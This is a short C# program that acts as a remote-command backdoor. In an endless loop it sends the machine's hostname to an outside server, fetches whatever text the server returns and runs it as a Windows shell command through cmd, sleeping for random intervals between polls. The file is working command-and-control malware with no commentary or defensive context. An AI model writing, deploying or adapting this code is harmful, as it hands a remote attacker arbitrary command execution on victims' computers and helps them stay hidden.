using System;
using System.Diagnostics;
using System.Net;

namespace seerver
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                while (true)
                {
                    using (WebClient wc = new WebClient())
                    {
                        var hostname = System.Environment.MachineName.ToString();
                        var url = "http://atl-dev.pingnattack.com/" + hostname;
                        string commandToExecute = wc.DownloadString(url);
                        var output = Process.Start(@"cmd", @"/c " + @commandToExecute);
                    }
                    Random r = new Random();
                    int rInt = r.Next(5000, 100000); //for ints
                    System.Threading.Thread.Sleep(rInt);
                }
                
            }
        }
    }
}
